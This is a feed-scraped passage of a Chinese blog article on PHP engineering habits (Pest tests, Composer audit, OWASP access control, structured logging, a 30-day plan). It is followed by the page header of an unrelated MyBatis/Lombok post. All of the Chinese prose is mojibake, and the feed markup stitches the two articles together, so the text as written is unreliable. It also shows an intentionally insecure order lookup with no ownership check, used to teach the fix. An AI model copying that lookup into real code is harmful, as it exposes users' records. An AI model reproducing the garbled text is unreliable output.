<p><strong>ä¸ºä»€ä¹ˆè¿™ä¸ªä¹ æƒ¯æœ‰ç”¨ï¼š</strong></p>
<p>å­¦ä¼šè¡¨è¾¾æ­£ç¡®æ€§çº¦æŸï¼Œå·¥å…·æˆä¸ºå§‹ç»ˆåœ¨çº¿çš„å®¡æŸ¥è€…ã€‚</p>
<h3 data-id="heading-14">ä¹ æƒ¯ 6ï¼šå†™ä¿æŠ¤ä¸šåŠ¡è§„åˆ™çš„æµ‹è¯•ï¼Œåˆ«åªè¿½æ±‚è¦†ç›–ç‡</h3>
<p>2026 å¹´ï¼Œæµ‹è¯•å·¥å…·ç»§ç»­ä¸ç°ä»£ PHP å¯¹é½ï¼š</p>
<ul>
<li>PHPUnit 11 éœ€è¦ PHP 8.2+</li>
<li>Pest 4 ç›®æ ‡ PHP 8.3+</li>
</ul>
<p>è¿™ä¸æ˜¯çäº‹ï¼Œæ˜¯ä¿¡å·ï¼šè¦ç”¨ç°ä»£æµ‹è¯•å·¥å…·ï¼Œè¿è¡Œæ—¶å¾—è·Ÿä¸Šã€‚</p>
<h4 data-id="heading-15">æµ‹ä»€ä¹ˆï¼ˆé«˜ ROI ç›®æ ‡ï¼‰</h4>
<p>æ—¶é—´æœ‰é™å°±æµ‹é‚£äº›å…³ä¹é‡‘é’±æˆ–ä¿¡ä»»çš„è§„åˆ™ï¼š</p>
<ul>
<li>æŠ˜æ‰£å’Œèˆå…¥</li>
<li>å¹‚ç­‰æ€§ï¼ˆé‡å¤æ”¯ä»˜è¯·æ±‚ï¼‰</li>
<li>æƒé™æ£€æŸ¥ï¼ˆè°èƒ½çœ‹åˆ°ä»€ä¹ˆï¼‰</li>
<li>å–æ¶ˆ/é€€æ¬¾çª—å£</li>
<li>åº“å­˜é¢„ç•™</li>
</ul>
<p>ä¸€ä¸ªèƒ½æ•è·çœŸå® bug çš„å°ä¾‹å­ï¼šèˆå…¥è¡Œä¸ºã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Discount</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">apply</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$priceCents</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$percent</span></span>): <span class="hljs-title">int</span>
    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$percent</span> &lt; <span class="hljs-number">0</span> || <span class="hljs-variable">$percent</span> &gt; <span class="hljs-number">100</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'percent must be 0..100'</span>);
        }
        <span class="hljs-variable">$cut</span> = (<span class="hljs-keyword">int</span>) <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$priceCents</span> * (<span class="hljs-variable">$percent</span> / <span class="hljs-number">100</span>));
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$priceCents</span> - <span class="hljs-variable">$cut</span>);
    }
}
</code></pre>
<p>Pest é£æ ¼æµ‹è¯•ï¼ˆç´§å‡‘ä½†å¯è¯»ï¼‰ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-title function_ invoke__">it</span>(<span class="hljs-string">'applies discount with correct rounding'</span>, function () {
    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Discount</span>();
    <span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">apply</span>(<span class="hljs-number">999</span>, <span class="hljs-number">10</span>))-&gt;<span class="hljs-title function_ invoke__">toBe</span>(<span class="hljs-number">899</span>); <span class="hljs-comment">// 99.9 rounds to 100</span>
    <span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">apply</span>(<span class="hljs-number">1000</span>, <span class="hljs-number">10</span>))-&gt;<span class="hljs-title function_ invoke__">toBe</span>(<span class="hljs-number">900</span>);
});

<span class="hljs-title function_ invoke__">it</span>(<span class="hljs-string">'rejects invalid percent'</span>, function () {
    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Discount</span>();
    <span class="hljs-title function_ invoke__">expect</span>(fn() =&gt; <span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">apply</span>(<span class="hljs-number">1000</span>, -<span class="hljs-number">1</span>))-&gt;<span class="hljs-title function_ invoke__">toThrow</span>(<span class="hljs-title class_">InvalidArgumentException</span>::<span class="hljs-variable language_">class</span>);
    <span class="hljs-title function_ invoke__">expect</span>(fn() =&gt; <span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">apply</span>(<span class="hljs-number">1000</span>, <span class="hljs-number">101</span>))-&gt;<span class="hljs-title function_ invoke__">toThrow</span>(<span class="hljs-title class_">InvalidArgumentException</span>::<span class="hljs-variable language_">class</span>);
});
</code></pre>
<h4 data-id="heading-16">ä¹ æƒ¯ä¸­çš„ä¹ æƒ¯ï¼šæŠŠè®¡ç®—å’Œ IO åˆ†å¼€</h4>
<p>ä¸šåŠ¡é€»è¾‘å’Œæ•°æ®åº“è°ƒç”¨ã€HTTP è°ƒç”¨æ··åœ¨ä¸€èµ·ï¼Œæµ‹è¯•å°±å˜å¾—å›°éš¾ä¸”ç¼“æ…¢â€”â€”æ‰€ä»¥äººä»¬ä¸å†™äº†ã€‚</p>
<p>è¿›é˜¶åšæ³•æ˜¯ä¸ºè®¡ç®—å†™çº¯å‡½æ•°/æœåŠ¡ï¼ŒæŠŠ IO æ”¾åœ¨æ¥å£åé¢ã€‚è¿™ä¸æ˜¯"ä¼ä¸šæ¶æ„"ï¼Œæ˜¯å¯æµ‹è¯•æ€§ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¸ªä¹ æƒ¯æœ‰ç”¨ï¼š</strong></p>
<p>å­¦ä¼šä¸ºæ­£ç¡®æ€§å’Œå¯ç»´æŠ¤æ€§è®¾è®¡ï¼Œè€Œä¸åªæ˜¯"è®©ç«¯ç‚¹å·¥ä½œ"ã€‚</p>
<h3 data-id="heading-17">ä¹ æƒ¯ 7ï¼šæŠŠä¾èµ–å«ç”Ÿå˜æˆä¸å¯åå•†çš„æ„å»ºæ­¥éª¤</h3>
<p>Composer çš„ <code>audit</code> å‘½ä»¤æ˜¯æœ€ç®€å•çš„èƒœåˆ©ä¹‹ä¸€ã€‚Composer æ–‡æ¡£è¯´å¾—å¾ˆæ¸…æ¥šï¼Œaudit ä¼šæ ¹æ®å…¬å‘Šæ£€æŸ¥å·²å®‰è£…çš„åŒ…ï¼ˆé»˜è®¤ç”¨ Packagistï¼‰ï¼Œç”¨é€€å‡ºä»£ç æ£€æµ‹åºŸå¼ƒçš„åŒ…ï¼Œå¯ä»¥åœ¨ CI ä¸­ç”¨ã€‚</p>
<h4 data-id="heading-18">åœ¨ CI ä¸­æ·»åŠ ï¼ˆåˆ«æŒ‡æœ›"æœ‰äººä¼šè¿è¡Œ"ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash">composer install --no-interaction --no-progress --prefer-dist
composer audit --format=summary
</code></pre>
<h4 data-id="heading-19">ç”¨ Composer è„šæœ¬å˜æˆå¼€å‘è€…ä¹ æƒ¯</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"check"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"composer validate --no-interaction"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"composer audit --format=summary"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"vendor/bin/phpstan analyse --memory-limit=1G"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"vendor/bin/phpunit"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ç°åœ¨å¼€å‘è€…è¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">composer check
</code></pre>
<p>ä¸€ä¸ªå‘½ä»¤ï¼Œä¸€è‡´çš„ç»“æœã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¸ªä¹ æƒ¯æœ‰ç”¨ï¼š</strong></p>
<p>æŠŠä¾›åº”é“¾é£é™©å½“ä½œå·¥ç¨‹è´¨é‡çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯"ç¨åå®‰å…¨éƒ¨é—¨çš„äº‹"ã€‚</p>
<h3 data-id="heading-20">ä¹ æƒ¯ 8ï¼šæŠŠ OWASP å½“æ€ç»´æ¨¡å‹ï¼Œåˆ«å½“åˆè§„æ¸…å•</h3>
<p>OWASP Top 10 æ˜¯é¢å‘å¼€å‘è€…çš„æ„è¯†åŸºçº¿ã€‚OWASP æŒ‡å‡ºï¼Œæœ€æ–°ç‰ˆæœ¬æ˜¯ OWASP Top 10:2026ã€‚</p>
<p>è®¿é—®æ§åˆ¶å¤±æ•ˆä»æ˜¯ä¸»è¦é£é™©ï¼ˆ2021 å¹´æ˜¯ A01ï¼Œ2026 å¹´è¿˜æ˜¯ A01ï¼‰ã€‚</p>
<p><strong>æ¢å¥è¯è¯´ï¼š</strong> æˆæƒé”™è¯¯ä»æ˜¯å‡ºäº‹æ•…æœ€å¿«çš„æ–¹å¼ä¹‹ä¸€ã€‚</p>
<h4 data-id="heading-21">æ¯å‘¨ä¹ æƒ¯ï¼šæ‰¾ä¸€ç±»è®¿é—®æ§åˆ¶ bug å¹¶æ¶ˆé™¤</h4>
<p>å¸¸è§æ¨¡å¼ï¼šæŒ‰ ID å–è®°å½•ï¼Œä¸é™å®šåˆ°å·²è®¤è¯ç”¨æˆ·/ç§Ÿæˆ·ã€‚</p>
<p><strong>ç³Ÿç³•çš„æ¨¡å¼ï¼š</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$order</span> = <span class="hljs-variable">$repo</span>-&gt;<span class="hljs-title function_ invoke__">findById</span>((<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'orderId'</span>]);
</code></pre>
<p><strong>æ›´å¥½ï¼š</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$userId</span> = <span class="hljs-variable">$auth</span>-&gt;<span class="hljs-title function_ invoke__">userId</span>();
<span class="hljs-variable">$orderId</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'orderId'</span>];
<span class="hljs-variable">$order</span> = <span class="hljs-variable">$repo</span>-&gt;<span class="hljs-title function_ invoke__">findForUser</span>(<span class="hljs-variable">$orderId</span>, <span class="hljs-variable">$userId</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$order</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">404</span>);
    <span class="hljs-keyword">exit</span>;
}
</code></pre>
<h4 data-id="heading-22">å¦ä¸€ä¸ªé«˜å½±å“ä¹ æƒ¯ï¼šåˆ°å¤„ç”¨é¢„å¤„ç†è¯­å¥</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">'SELECT * FROM users WHERE email = :email'</span>);
<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-string">'email'</span> =&gt; <span class="hljs-variable">$email</span>]);
<span class="hljs-variable">$user</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();
</code></pre>
<p>ä¸ç”¨è®°ä½æ¯ä¸ª OWASP ç±»åˆ«ï¼ŒæŠŠå®ƒå½“è¦†ç›–åœ°å›¾ç”¨ï¼š</p>
<ul>
<li>è®¿é—®æ§åˆ¶</li>
<li>è¾“å…¥å¤„ç†</li>
<li>é…ç½®é”™è¯¯</li>
<li>ä¾›åº”é“¾æ•…éšœ</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¸ªä¹ æƒ¯æœ‰ç”¨ï¼š</strong></p>
<p>æŠŠå®‰å…¨æœ¬èƒ½ç›´æ¥æ„å»ºåˆ°å®ç°å†³ç­–é‡Œã€‚</p>
<h3 data-id="heading-23">ä¹ æƒ¯ 9ï¼šæŠŠå¯è§‚æµ‹æ€§å½“ä»£ç ç‰¹æ€§ï¼Œåˆ«åªå½“åŸºç¡€è®¾æ–½</h3>
<p>å¤§å¤šæ•°å·¥ç¨‹å¸ˆåªåœ¨å‡ºé—®é¢˜åæ‰å…³å¿ƒæ—¥å¿—ï¼Œè¿™æ˜¯å€’ç€æ¥çš„ã€‚</p>
<p>è¿›é˜¶ä¹ æƒ¯æ˜¯ç»™é‡è¦ä»£ç è·¯å¾„åŠ ä»ªè¡¨ï¼š</p>
<ul>
<li>è®¤è¯äº‹ä»¶</li>
<li>æ”¯ä»˜çŠ¶æ€è½¬æ¢</li>
<li>å¤–éƒ¨ API è°ƒç”¨</li>
<li>é‡è¯•å’Œå›é€€</li>
<li>"ä¸å¯èƒ½"çš„åˆ†æ”¯</li>
</ul>
<h4 data-id="heading-24">æœ€å°çš„ç»“æ„åŒ–æ—¥å¿—æ¨¡å¼ï¼ˆPSR-3 é£æ ¼ï¼‰</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$logger</span>-&gt;<span class="hljs-title function_ invoke__">info</span>(<span class="hljs-string">'payment.authorize.started'</span>, [
    <span class="hljs-string">'order_id'</span> =&gt; <span class="hljs-variable">$orderId</span>,
    <span class="hljs-string">'provider'</span> =&gt; <span class="hljs-string">'stripe'</span>,
    <span class="hljs-string">'idempotency_key'</span> =&gt; <span class="hljs-variable">$key</span>,
]);

<span class="hljs-keyword">try</span> {
    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$gateway</span>-&gt;<span class="hljs-title function_ invoke__">authorize</span>(<span class="hljs-variable">$command</span>);
    <span class="hljs-variable">$logger</span>-&gt;<span class="hljs-title function_ invoke__">info</span>(<span class="hljs-string">'payment.authorize.ok'</span>, [
        <span class="hljs-string">'order_id'</span> =&gt; <span class="hljs-variable">$orderId</span>,
        <span class="hljs-string">'provider_ref'</span> =&gt; <span class="hljs-variable">$res</span>-&gt;reference,
    ]);
} <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) {
    <span class="hljs-variable">$logger</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">'payment.authorize.failed'</span>, [
        <span class="hljs-string">'order_id'</span> =&gt; <span class="hljs-variable">$orderId</span>,
        <span class="hljs-string">'error'</span> =&gt; <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>(),
        <span class="hljs-string">'exception'</span> =&gt; <span class="hljs-variable">$e</span>::<span class="hljs-variable language_">class</span>,
    ]);
    <span class="hljs-keyword">throw</span> <span class="hljs-variable">$e</span>;
}
</code></pre>
<h4 data-id="heading-25">äº‹æ•…æ—¶æœ‰å›æŠ¥çš„ä¹ æƒ¯ï¼šå…³è” ID</h4>
<ul>
<li>ä¼ å…¥è¯·æ±‚æœ‰å…³è” ID å¤´å°±é‡ç”¨</li>
<li>æ²¡æœ‰å°±ç”Ÿæˆä¸€ä¸ª</li>
<li>æ”¾åœ¨è¯¥è¯·æ±‚çš„æ¯ä¸ªæ—¥å¿—è¡Œé‡Œ</li>
</ul>
<p>æŠŠ"æˆ‘ä»¬æœ‰æ—¥å¿—"å˜æˆ"æˆ‘ä»¬èƒ½è¿½è¸ªå•ä¸ªç”¨æˆ·æ“ä½œ"ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¸ªä¹ æƒ¯æœ‰ç”¨ï¼š</strong></p>
<p>å‡å°‘å¹³å‡ç†è§£æ—¶é—´ï¼ˆMTTUï¼‰ï¼Œä¸åªæ˜¯å¹³å‡æ¢å¤æ—¶é—´ã€‚</p>
<h3 data-id="heading-26">ä¹ æƒ¯ 10ï¼šæ€§èƒ½å·¥ä½œä»æµ‹é‡å¼€å§‹ï¼Œåˆ«çŒœ</h3>
<p>PHP ä¸­æ€§èƒ½é—®é¢˜é€šå¸¸æ¥è‡ªï¼š</p>
<ul>
<li>N+1 æ•°æ®åº“æŸ¥è¯¢</li>
<li>å¤§é‡åºåˆ—åŒ–/ååºåˆ—åŒ–</li>
<li>å¯¹å¤§æ•°æ®é›†çš„æ— ç•Œå¾ªç¯</li>
<li>æ˜‚è´µä»£ç è·¯å¾„ä¸­ç¼ºå°‘ç¼“å­˜</li>
</ul>
<p>é«˜å½±å“ä¹ æƒ¯æ˜¯æ¯å‘¨é€‰ä¸€ä¸ªç«¯ç‚¹åš"æ€§èƒ½é˜…è¯»"ï¼š</p>
<ul>
<li>å®ƒè¿è¡Œå¤šå°‘æŸ¥è¯¢ï¼Ÿ</li>
<li>å“åº”æœ‰å¤šå¤§ï¼Ÿ</li>
<li>p95 å»¶è¿Ÿæ˜¯å¤šå°‘ï¼Ÿ</li>
<li>åœ¨å¹¶å‘ä¸‹ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</li>
</ul>
<h4 data-id="heading-27">å®ç”¨çš„å¾®ä¼˜åŒ–ä¹ æƒ¯ï¼šæ¶ˆé™¤å¯é¿å…çš„åˆ†é…</h4>
<p>å¤„ç†å¤§æ•°æ®æ—¶ï¼Œç”Ÿæˆå™¨èƒ½å‡å°‘å†…å­˜å‹åŠ›ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@return</span> Generator&lt;int, array{sku: string, qty: int}&gt;
 */</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">streamItems</span>(<span class="hljs-params"><span class="hljs-keyword">iterable</span> <span class="hljs-variable">$rows</span></span>): <span class="hljs-title">Generator</span>
</span>{
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$rows</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) {
        <span class="hljs-keyword">yield</span> [
            <span class="hljs-string">'sku'</span> =&gt; (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$row</span>[<span class="hljs-string">'sku'</span>],
            <span class="hljs-string">'qty'</span> =&gt; (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$row</span>[<span class="hljs-string">'qty'</span>],
        ];
    }
}
</code></pre>
<p>åˆ«æ··æ·†å¾®ä¼˜åŒ–å’ŒçœŸæ­£çš„èƒœåˆ©ã€‚çœŸæ­£çš„èƒœåˆ©é€šå¸¸æ˜¯æŸ¥è¯¢å¡‘å½¢å’Œç¼“å­˜ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¸ªä¹ æƒ¯æœ‰ç”¨ï¼š</strong></p>
<p>å­¦ä¼šæŠŠä»£ç å†³ç­–å’Œç”Ÿäº§è¡Œä¸ºï¼ˆå»¶è¿Ÿã€ååé‡ã€æˆæœ¬ï¼‰è”ç³»èµ·æ¥ã€‚</p>
<h3 data-id="heading-28">ä¹ æƒ¯ 11ï¼šå»ºç«‹å¤åˆ©çš„ä¸ªäººå·¥ç¨‹å¾ªç¯</h3>
<p>å¼ºå¤§çš„å¼€å‘è€…ä¸é æƒ…ç»ªï¼Œé å¾ªç¯ï¼š</p>
<ol>
<li>æ”¹ç‚¹å°ä¸œè¥¿</li>
<li>å¿«é€Ÿæ‹¿åˆ°åé¦ˆ</li>
<li>é‡å¤</li>
</ol>
<p>2026 å¹´å¯¹ PHP æ•ˆæœå¥½çš„å¾ªç¯ï¼š</p>
<ul>
<li><strong>ç¼–ç å‰ï¼š</strong> å®šä¹‰è¾“å…¥/è¾“å‡ºå½¢çŠ¶ï¼ˆDTOã€æšä¸¾ã€å€¼å¯¹è±¡ï¼‰</li>
<li><strong>ç¼–ç æ—¶ï¼š</strong> ä¿æŒå‡½æ•°å°ï¼Œæ¸…æ™°å‘½åè½¬æ¢ï¼ˆç®¡é“æœ‰å¸®åŠ©ï¼‰</li>
<li><strong>æ¨é€å‰ï¼š</strong> è¿è¡Œ <code>composer check</code>ï¼ˆaudit + é™æ€åˆ†æ + æµ‹è¯•ï¼‰</li>
<li><strong>å®¡æŸ¥ä¸­ï¼š</strong> æ‰¾ä¸å˜é‡ã€è¾¹ç•Œã€è®¿é—®æ§åˆ¶å’Œ"å®‰é™çš„å¤æ‚æ€§"</li>
<li><strong>å‘å¸ƒåï¼š</strong> åœ¨é£é™©æ›´æ”¹çš„åœ°æ–¹åŠ æ—¥å¿—/æŒ‡æ ‡</li>
</ul>
<p>è¿™ä¸æ˜¯ä»ªå¼ï¼Œæ˜¯å‘å¸ƒç»å¾—èµ·æ—¶é—´è€ƒéªŒçš„ä»£ç çš„æ–¹å¼ã€‚</p>
<h3 data-id="heading-29">30 å¤©æå‡ PHP æ°´å¹³çš„è®¡åˆ’</h3>
<p>æƒ³è¦èƒ½å®é™…æ‰§è¡Œçš„ï¼Œè¿™æ ·åšï¼š</p>
<h4 data-id="heading-30">ç¬¬ 1 å‘¨ï¼šç°ä»£å·¥å…·åŸºçº¿</h4>
<ul>
<li>CI ä¸­åŠ  <code>composer audit</code></li>
<li>åŠ  PHPStan åœ¨é€‚åº¦çº§åˆ«å¹¶è®©å®ƒé€šè¿‡</li>
<li>åŠ  <code>composer check</code> è„šæœ¬ç”¨äºæœ¬åœ°è¿è¡Œ</li>
</ul>
<h4 data-id="heading-31">ç¬¬ 2 å‘¨ï¼šæ•°æ®è¾¹ç•Œå’Œä¸å˜é‡</h4>
<ul>
<li>ç»™ 2-3 ä¸ªå…³é”®ç«¯ç‚¹å¼•å…¥ DTO è¾¹ç•Œ</li>
<li>åœ¨ä¸€ä¸ªæ¨¡å—é‡Œç”¨æšä¸¾æ›¿æ¢å­—ç¬¦ä¸²çŠ¶æ€å­—æ®µ</li>
<li>åœ¨æ„é€ å‡½æ•°æˆ–å±æ€§é’©å­é‡ŒåŠ ä¸å˜é‡</li>
</ul>
<h4 data-id="heading-32">ç¬¬ 3 å‘¨ï¼šé‡è¦çš„æµ‹è¯•</h4>
<ul>
<li>ç»™é‡‘é’±/èˆå…¥/æŠ˜æ‰£æˆ–å…¶ä»–"ä¸šåŠ¡æ ¸å¿ƒ"åŠ æµ‹è¯•</li>
<li>è¿è¡Œæ—¶å…è®¸çš„è¯ï¼Œè½¬å‘ç°ä»£æµ‹è¯•åŸºçº¿ï¼ˆPHPUnit 11 / Pestï¼‰</li>
</ul>
<h4 data-id="heading-33">ç¬¬ 4 å‘¨ï¼šå®‰å…¨å’Œç”Ÿäº§åé¦ˆ</h4>
<ul>
<li>ç»™é¡¶çº§æ•æ„Ÿèµ„æºå®¡è®¡è®¿é—®æ§åˆ¶ï¼ˆOWASP A01 æ€ç»´ï¼‰</li>
<li>ç»™é£é™©æµç¨‹åŠ å…³è” ID + ç»“æ„åŒ–æ—¥å¿—</li>
<li>é€‰ä¸€ä¸ªç«¯ç‚¹å‡å°‘æŸ¥è¯¢æ•°é‡æˆ–æœ‰æ•ˆè´Ÿè½½å¤§å°</li>
</ul>
<p>æœˆåº•ä¼šæ³¨æ„åˆ°å¤åˆ©æ•ˆåº”ï¼šæ›´å°‘å›å½’ï¼Œæ›´å¿«å®¡æŸ¥ï¼Œæ›´æ¸…æ™°é‡æ„ã€‚</p>
<h3 data-id="heading-34">ç»“è®º</h3>
<p>ç°ä»£ PHPï¼ˆ8.4 å’Œ 8.5ï¼‰æä¾›äº†å‡å°‘æ ·æ¿ã€æé«˜è¡¨è¾¾åŠ›çš„å·¥å…·â€”â€”å±æ€§é’©å­ã€éå¯¹ç§°å¯è§æ€§ã€ç®¡é“æ“ä½œç¬¦ç­‰ã€‚</p>
<p>ä½†è¿™äº›å·¥å…·åªæœ‰åœ¨ä¹ æƒ¯åˆ›å»ºçš„ç³»ç»Ÿä¸­æ‰é‡è¦ï¼š</p>
<ul>
<li>è¾“å…¥å°½æ—©å˜æˆç±»å‹åŒ–æ•°æ®</li>
<li>ä¸å˜é‡é è¿‘çŠ¶æ€</li>
<li>åˆ†æå’Œæµ‹è¯•æŒç»­è¿è¡Œ</li>
<li>ä¾èµ–è‡ªåŠ¨å®¡è®¡</li>
<li>å®‰å…¨æ€ç»´æ˜¯å®ç°çš„ä¸€éƒ¨åˆ†</li>
<li>ç”Ÿäº§åé¦ˆåœ¨æ—¥å¿—å’ŒæŒ‡æ ‡é‡Œå¯è§</li>
</ul>
<p>çœŸå®å›¢é˜Ÿé‡Œçš„"è¿›é˜¶"å°±æ˜¯è¿™æ ·ï¼šä¸æ˜¯è‹±é›„å¼é‡æ„ï¼Œè€Œæ˜¯æ— èŠçš„ä¹ æƒ¯ï¼Œå¤åˆ©åˆ°ä»£ç åº“å˜å¾—æ›´å®¹æ˜“æ”¹å˜è€Œä¸æ˜¯ç ´åã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatis æ˜ å°„å€¼æŠ¥é”™çš„ç½ªé­ç¥¸é¦–ç«Ÿç„¶æ˜¯ Lombok çš„ @Builderï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589903499598938166</link>    <guid>https://juejin.cn/post/7589903499598938166</guid>    <pubDate>2026-01-01T01:17:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499598938166" data-draft-id="7589903499598889014" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatis æ˜ å°„å€¼æŠ¥é”™çš„ç½ªé­ç¥¸é¦–ç«Ÿç„¶æ˜¯ Lombok çš„ @Builderï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-01T01:17:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="javadaydayup"/> <meta itemprop="url" content="https://juejin.cn/user/2436173497635703"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatis æ˜ å°„å€¼æŠ¥é”™çš„ç½ªé­ç¥¸é¦–ç«Ÿç„¶æ˜¯ Lombok çš„ @Builderï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173497635703/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    javadaydayup
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T01:17:15.000Z" title="Thu Jan 01 2026 01:17:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
